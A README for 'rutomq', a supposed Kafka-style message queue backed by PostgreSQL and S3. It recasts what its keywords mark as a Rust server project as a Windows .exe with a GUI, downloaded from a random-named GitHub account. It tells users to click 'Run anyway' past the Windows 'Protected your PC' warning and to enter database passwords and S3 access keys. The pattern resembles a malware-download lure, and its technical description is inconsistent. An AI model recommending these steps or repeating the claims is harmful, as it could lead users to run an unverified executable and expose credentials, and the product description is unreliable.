# 📦 rutomq - Store and stream your messages reliably

[![Download rutomq](https://img.shields.io/badge/Download-rutomq-blue.svg)](https://github.com/cathleencombinable612/rutomq)

rutomq acts as a bridge for your data. It manages message queues while keeping your infrastructure simple. It stores data in your own database and object storage systems. You gain the benefits of a modern message queue without the need to manage complex local storage files on your server.

## 🛠️ System Requirements

Before you install this software, check that your computer meets these requirements:

- Operating System: Windows 10 or Windows 11 (64-bit).
- Memory: At least 4 gigabytes of available RAM.
- Storage: 200 megabytes of free disk space.
- Network: A stable internet connection.
- Database: An existing PostgreSQL server accessible by this machine.
- Storage: Access to S3-compatible object storage.

## 📥 How to Download 

You need to obtain the latest version of the software package. Follow these instructions to get the correct files:

1. Visit the repository page to view the list of available versions for Windows: [https://github.com/cathleencombinable612/rutomq](https://github.com/cathleencombinable612/rutomq).
2. Look for the "Releases" section on the right side of the page.
3. Click on the latest release version.
4. Locate the asset that ends with the .exe extension.
5. Click this file to start the download to your computer.

## ⚙️ Installation Steps

Windows might show a security prompt when you open the file for the first time. This happens because the software communicates with your network to handle message queues.

1. Open your Downloads folder.
2. Double-click the downloaded rutomq file.
3. A Windows "Protected your PC" window may appear. If this happens, click "More info" and then click "Run anyway."
4. Follow the prompts in the installer window to place the files in your preferred location.
5. Once the installer finishes, a shortcut will appear on your desktop.

## 🚀 Setting Up Your Configuration

rutomq requires configuration to connect to your PostgreSQL database and your S3 storage bucket. The software creates a configuration file during the first launch.

1. Open the rutomq application.
2. Navigate to the "Settings" menu option.
3. Enter your PostgreSQL connection string in the database field. This string typically includes your server address, port, username, and password.
4. Enter your S3 bucket name and access credentials. The application uses these to store the message blocks.
5. Select "Save and Restart" to apply the changes.

The application checks the connection status within the main dashboard. A green status indicator confirms that rutomq connects to both your database and your cloud storage.

## 📈 Monitoring Performance

Once the system runs, you can monitor the flow of messages through the main dashboard. The interface shows several key metrics:

- Message Throughput: This number represents how many messages pass through the queue every second.
- Latency: This tracks how long a message spends in the queue.
- Storage Usage: This indicates the amount of data saved to your object storage provider.

If you encounter errors during operation, click the "Logs" tab. The tool displays a list of recent events. A red highlight indicates a connection failure or a storage access error. Ensure your network permits traffic to both your database server and your object storage provider.

## 🔄 Using rutomq with Other Software

This application uses the standard protocols compatible with common messaging tools. You can point your existing applications toward the port configured in your settings. rutomq acts as a transparent layer for your streaming data. 

Because the system stores data immediately in PostgreSQL and S3, you do not need to worry about losing data if the application closes unexpectedly. The stateless nature of the tool allows you to stop and start the process without manual cleanup.

## 🛡️ Security and Maintenance

Keep your configuration files secure. They contain sensitive access keys for your cloud storage and database. Do not share these files with unauthorized users. 

Periodically check the download link provided above to see if a newer version exists. Updates often include performance improvements for data transfer and minor stability fixes for Windows environments. To update, simply download the new version and run the installer over the existing installation folder.

## ❓ Troubleshooting Common Issues

If the application fails to start, verify that no other program uses the same network port. Check the "Network" tab in your Task Manager to confirm that the port remains clear.

If the application cannot write to your storage, check your S3 bucket permissions. Ensure the credentials you provided in the configuration menu give you write access to the specific bucket. 

For database connectivity issues, confirm that your PostgreSQL server allows incoming connections from the machine running rutomq. Adjust your database firewall rules if necessary.

Keywords: distributed-systems, flink, kafka, kafka-protocol, kubernetes, message-queue, object-storage, opendal, postgresql, rust, s3, streaming